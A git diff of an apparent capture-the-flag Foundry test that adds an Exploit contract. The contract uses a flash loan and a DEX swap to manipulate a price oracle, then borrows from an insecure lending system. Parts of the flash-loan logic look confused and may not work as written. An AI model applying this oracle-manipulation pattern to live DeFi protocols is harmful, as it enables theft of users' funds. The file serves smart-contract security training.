@@ -2,6 +2,7 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
+import "forge-std/console.sol";
 
 import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
 import {BoringToken} from "../src/tokens/tokenBoring.sol";
@@ -60,7 +61,7 @@ contract Challenge3Test is Test {
 
     }
 
-    function testChallenge() public {  
+    function testChallenge3() public {  
 
         vm.startPrank(player);
 
@@ -69,6 +70,17 @@ contract Challenge3Test is Test {
         //////////////////////////////*/
 
         //============================//
+        Exploit exp = new Exploit(oracleDex, target, token0, token1);
+
+        flashLoanPool.flashLoan(
+          address(exp),
+          abi.encodeWithSignature(
+            "receiveFlashLoan(address)", address(exp)
+          )
+        );
+
+        exp.withdrawFunds(address(flashLoanPool));
+        exp.hack();
 
         vm.stopPrank();
 
@@ -82,8 +94,56 @@ contract Challenge3Test is Test {
 ////////////////////////////////////////////////////////////*/
 
 contract Exploit {
+
+    /// @dev Token contract address to be used for lending.
+    //IERC20 immutable public token;
+    IERC20 public token;
+    /// @dev Internal balances of the pool for each user.
+    mapping(address => uint) public balances;
+
+    // flag to notice contract is on a flashloan
+    bool private _flashLoan;
+    
+
     IERC20 token0;
     IERC20 token1;
     BorrowSystemInsecureOracle borrowSystem;
     InsecureDexLP dex;
+
+
+    //Flashloan event
+    function receiveFlashLoan(address _attacker) external {
+        balances[_attacker] = 10000 ether;
+    }
+
+    //Flashloan withdraw
+    function withdrawFunds(address _contractToHack) external {
+        _contractToHack.call(abi.encodeWithSignature("withdraw(uint256)", 10000 ether));
+    }
+    
+    
+    constructor(InsecureDexLP _dex, BorrowSystemInsecureOracle _borrowSystem, IERC20 _token0, IERC20 _token1 ){
+        token0 = _token0;
+        token1 = _token1;
+        borrowSystem = _borrowSystem;
+     
+        dex = _dex;
+
+        token0.approve(address(borrowSystem), 10000 ether);
+        token0.approve(address(dex), 10000 ether);
+        token1.approve(address(borrowSystem), 10000 ether);
+        token1.approve(address(dex), 10000 ether);
+    }
+
+
+    function hack() public {
+        uint256 balance0 = token0.balanceOf(address(this));
+        dex.swap(address(token0), address(token1), balance0);
+
+        uint256 balance1 = token1.balanceOf(address(this));
+        
+        borrowSystem.depositToken1(balance1);
+        borrowSystem.borrowToken0(balance0);
+    }
+    
 }
